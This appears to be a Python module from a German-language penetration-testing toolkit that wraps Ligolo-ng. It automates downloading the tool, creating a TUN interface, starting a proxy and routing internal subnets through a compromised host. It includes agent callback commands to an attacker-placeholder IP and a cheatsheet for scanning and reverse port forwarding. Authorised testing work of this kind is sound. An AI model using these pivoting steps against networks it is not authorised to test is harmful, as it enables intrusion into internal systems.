"""
Ligolo-ng — Netzwerk-Pivoting durch kompromittierte Hosts.

Ligolo-ng erstellt einen TUN-Interface-Tunnel vom Kali-Rechner
durch einen kompromittierten Host (Agent) ins Zielnetzwerk.

Beispiel:
  Kali → Agent (Windows VM) → internes Netz 10.10.10.0/24
  Nach Setup: Kali kann direkt auf 10.10.10.x zugreifen

Architektur:
  Kali (Proxy)  ←──mTLS── Ziel (Agent)
       |
  TUN-Interface (ligolo)
       |
  Route 10.10.10.0/24 → ligolo
       |
  Kali kann jetzt direkt 10.10.10.x anpingen/scannen/exploiten

Im Vergleich zu SSH-Tunneln:
  - Kein SSH nötig
  - Volles Routing (nicht nur SOCKS)
  - Mehrere Netzwerke gleichzeitig
  - UDP + ICMP werden weitergeleitet
"""
from __future__ import annotations
import asyncio
import os
import platform
import shutil
import urllib.request
from typing import AsyncGenerator

from core.danger import DangerLevel
from core.runner import CommandRunner
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Ligolo-ng Pivoting",
    description=(
        "Netzwerk-Pivoting durch kompromittierte Hosts. "
        "Kali bekommt vollen Netzwerkzugriff auf interne Segmente."
    ),
    usage="Proxy auf Kali starten → Agent auf Ziel ausführen → Route hinzufügen.",
    danger_note="⛔ BLACK — nur auf autorisierten Netzwerken.",
    example="Route 10.10.10.0/24 → Kali kann intern scannen",
)

DANGER = DangerLevel.BLACK

_LIGOLO_GITHUB = "https://github.com/nicocha30/ligolo-ng/releases/latest"
_LIGOLO_PROXY  = "ligolo-proxy"
_AGENT_DIR     = "/tmp/ligolo"


def _proxy_path() -> str | None:
    p = shutil.which(_LIGOLO_PROXY)
    if p:
        return p
    local = os.path.join(_AGENT_DIR, _LIGOLO_PROXY)
    if os.path.exists(local):
        return local
    return None


def is_installed() -> bool:
    return _proxy_path() is not None


def _get_arch() -> str:
    m = platform.machine().lower()
    if "x86_64" in m or "amd64" in m:
        return "amd64"
    if "aarch64" in m or "arm64" in m:
        return "arm64"
    return "amd64"


class LigoloInstall:
    async def run(self) -> AsyncGenerator[str, None]:
        if is_installed():
            yield f"[+] Ligolo-ng bereits installiert: {_proxy_path()}"
            return

        yield "[*] Installiere Ligolo-ng..."
        yield "[*] Lade Releases von GitHub..."

        arch = _get_arch()
        os.makedirs(_AGENT_DIR, exist_ok=True)

        runner = CommandRunner()

        # Download latest release via curl
        proxy_url = (
            f"$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
            f" | grep 'browser_download_url' | grep 'proxy_Linux_{arch}' | grep -v '.sha256'"
            f" | cut -d '\"' -f 4)"
        )
        agent_url = (
            f"$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
            f" | grep 'browser_download_url' | grep 'agent_Linux_{arch}' | grep -v '.sha256'"
            f" | cut -d '\"' -f 4)"
        )

        cmd = (
            f"cd {_AGENT_DIR} && "
            f"PROXY_URL={proxy_url} && "
            f"AGENT_URL={agent_url} && "
            f"curl -sSL -o ligolo-proxy.tar.gz \"$PROXY_URL\" && "
            f"curl -sSL -o ligolo-agent.tar.gz \"$AGENT_URL\" && "
            f"tar xzf ligolo-proxy.tar.gz && tar xzf ligolo-agent.tar.gz && "
            f"chmod +x ligolo-proxy ligolo-agent 2>/dev/null; ls -la"
        )

        async for line in runner.stream(["bash", "-c", cmd], timeout=120):
            yield line

        if is_installed():
            yield f"\n[+] Ligolo-ng installiert in {_AGENT_DIR}/"
        else:
            yield "\n[!] Automatische Installation fehlgeschlagen."
            yield "[*] Manuell installieren:"
            yield f"    cd {_AGENT_DIR}"
            yield f"    curl -L {_LIGOLO_GITHUB} → passende Version laden"
            yield "    chmod +x ligolo-proxy ligolo-agent"


class LigoloProxy:
    def __init__(
        self,
        listen_port: int = 11601,
        use_selfcert: bool = True,
    ):
        self.port      = listen_port
        self.selfcert  = use_selfcert
        self._running  = True

    async def start(self) -> AsyncGenerator[str, None]:
        proxy = _proxy_path()
        if not proxy:
            yield "[!] Ligolo-ng nicht installiert — erst Option 1 ausführen."
            return

        # TUN interface einrichten
        yield "[*] Erstelle TUN-Interface 'ligolo'..."
        runner = CommandRunner()
        async for line in runner.stream(
            ["bash", "-c", "sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null; "
                           "sudo ip link set ligolo up 2>/dev/null; ip link show ligolo"],
            timeout=10,
        ):
            if line.strip():
                yield f"    {line}"

        cert_flag = "--selfcert" if self.selfcert else ""
        proxy_cmd = f"{proxy} {cert_flag} -laddr 0.0.0.0:{self.port}"

        yield f"\n[+] TUN-Interface bereit."
        yield f"[*] Starte Ligolo Proxy auf Port {self.port}..."
        yield f"[*] Warte auf Agent-Verbindung..."
        yield ""
        yield "─" * 55
        yield f"  Agent-Befehl für Ziel (Windows):"
        yield f"  ligolo-agent.exe -connect <KALI-IP>:{self.port} -ignore-cert"
        yield ""
        yield f"  Agent-Befehl für Ziel (Linux):"
        yield f"  ./ligolo-agent -connect <KALI-IP>:{self.port} -ignore-cert"
        yield "─" * 55
        yield ""
        yield "[*] Nach Agent-Verbindung in Ligolo-Konsole:"
        yield "    session          ← Session auswählen"
        yield "    start            ← Tunnel aktivieren"
        yield "    [Ctrl+C]         ← zurück zum Menü"
        yield ""
        yield "[*] Dann Route hinzufügen (Option 3 im Ligolo-Menü)."
        yield ""

        async for line in runner.stream(
            ["bash", "-c", proxy_cmd],
            timeout=3600,
        ):
            yield line

    def stop(self):
        self._running = False


class LigoloRouteManager:
    async def add_route(self, subnet: str, interface: str = "ligolo") -> AsyncGenerator[str, None]:
        yield f"[*] Füge Route hinzu: {subnet} → {interface}"
        runner = CommandRunner()
        async for line in runner.stream(
            ["bash", "-c", f"sudo ip route add {subnet} dev {interface}"],
            timeout=10,
        ):
            yield line
        yield f"[+] Route gesetzt. Test:"
        yield f"    ping -c1 <IP im Zielnetz>"
        yield f"    nmap -sV <IP im Zielnetz>"

    async def show_routes(self) -> AsyncGenerator[str, None]:
        yield "[*] Aktuelle Routen:"
        runner = CommandRunner()
        async for line in runner.stream(["ip", "route"], timeout=5):
            yield f"    {line}"

    async def remove_interface(self) -> AsyncGenerator[str, None]:
        yield "[*] Entferne ligolo TUN-Interface..."
        runner = CommandRunner()
        async for line in runner.stream(
            ["bash", "-c", "sudo ip link delete ligolo 2>&1 || echo 'nicht vorhanden'"],
            timeout=10,
        ):
            yield line


def get_cheatsheet() -> list[str]:
    return [
        "═══════════════ LIGOLO-NG CHEATSHEET ═══════════════",
        "",
        "SETUP:",
        "  1. Kali: sudo ip tuntap add user $(whoami) mode tun ligolo",
        "  2. Kali: sudo ip link set ligolo up",
        "  3. Kali: ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
        "  4. Ziel: ./ligolo-agent -connect KALI_IP:11601 -ignore-cert",
        "",
        "IN LIGOLO KONSOLE:",
        "  session              ← Session auswählen",
        "  ifconfig             ← Netzwerke am Ziel anzeigen",
        "  start                ← Tunnel aktivieren",
        "",
        "ROUTEN HINZUFÜGEN (neues Terminal auf Kali):",
        "  sudo ip route add 10.10.10.0/24 dev ligolo",
        "  sudo ip route add 172.16.0.0/16 dev ligolo",
        "",
        "NACH SETUP:",
        "  ping 10.10.10.5               ← funktioniert direkt",
        "  nmap -sV 10.10.10.0/24        ← ganzes Subnetz scannen",
        "  curl http://10.10.10.5/       ← interne Webseiten",
        "",
        "MEHRERE NETZWERKE:",
        "  Für jedes Netz: eigene Route + neues ligolo Interface",
        "  sudo ip tuntap add user $(whoami) mode tun ligolo2",
        "",
        "LISTENER (Port-Forwarding zurück):",
        "  In Ligolo-Konsole:",
        "  listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234",
        "  → Port 1234 auf Ziel → Kali Port 1234",
        "═════════════════════════════════════════════════════",
    ]
